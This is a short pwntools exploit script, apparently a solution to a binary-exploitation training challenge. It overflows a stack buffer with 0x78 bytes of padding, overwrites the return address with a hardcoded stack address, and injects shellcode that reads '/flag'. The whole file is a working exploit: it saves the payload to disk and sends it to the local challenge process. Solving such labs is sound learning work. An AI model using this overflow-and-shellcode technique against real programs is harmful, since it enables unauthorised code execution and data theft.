import sys
from pwn import *

p = process('/challenge/binary-exploitation-hijack-to-shellcode', env={})
context.arch = 'amd64'

shellcode = asm(shellcraft.cat("/flag"))

payload = b"A" * 0x78
win = p64(0x7fffffffdcf0)
payload += win
payload += shellcode
with open("payload_hijack2shellcode", "wb") as f:
    f.write(payload)
input()
p.send(payload)
p.interactive()
